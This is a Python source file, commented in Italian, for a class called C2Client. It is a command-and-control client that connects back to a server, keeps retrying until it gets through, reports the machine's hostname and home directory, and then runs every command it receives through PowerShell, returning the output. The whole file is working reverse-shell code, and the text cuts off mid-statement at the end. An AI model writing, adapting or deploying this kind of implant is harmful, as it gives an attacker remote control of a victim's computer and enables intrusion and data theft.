import socket
import subprocess
import time
import os

class C2Client:
    """Gestisce la connessione e l'esecuzione dei comandi sul lato client."""
    
    def __init__(self, host="127.0.0.1", port=8081):
        self.host = host
        self.port = port
        self.socket = None
        # Imposta la directory iniziale dell'utente
        self.current_dir = os.path.expanduser("~")
        self.hostname = socket.gethostname()

    def connect(self):
        """Tenta la connessione al server finché non ha successo."""
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.host, self.port))
                
                # Handshake iniziale: invia Path e Hostname al server
                handshake_data = f"{self.current_dir}#{self.hostname}"
                self.socket.send(handshake_data.encode('utf-8'))
                
                print(f"[*] Connesso a {self.host}:{self.port}")
                return True
            except (socket.error, ConnectionRefusedError):
                print("[!] Server non trovato, riprovo in 5 secondi...")
                time.sleep(5)

    def execute_command(self, command):
        """Esegue il comando tramite PowerShell e cattura output e nuova posizione."""
        try:
            # Script PowerShell per eseguire il comando e restituire la nuova directory
            ps_script = f'Set-Location "{self.current_dir}"; {command}; "#!p#" + (Get-Location).Path'
            
            process = subprocess.run(
                ['powershell.exe', '-Command', ps_script],
                capture_output=True,
                text=True,
                shell=True
            )
            
            full_output = process.stdout + process.stderr
            
            if "#!p#" in full_output:
                output, new_path = full_output.strip().split("#!p#")
                self.current_dir = new_path.strip()
                return output if output.strip() else "."
            else:
                return full_output
                
        except Exception as e:
            return f"Errore esecuzione: {str(e)}"

    def run(self):
        """Ciclo principale di ricezione ed esecuzione."""
        while True:
            if not self.socket or self.connect():
                try:
                    while True:
                        # Riceve il comando dal server
                        data = self.socket.recv(4096).decode('utf-8', errors="replace").strip()
                        
                        if not data:
                            break
                        
                        if data == "cclose":
                            print("[*] Chiusura connessione richiesta dal server.")
                            self.socket.close()
                            return

                        # Esegue e risponde con il formato atteso: "output#path#nuovopath"
                        result = self.execute_command(data)
                        response = f"{result}#path#{self.current_dir}"
                        self.socket.send(response.encode('utf-8'))

                except (ConnectionResetError, BrokenPipeError):
                    print("[!] Connessione inter
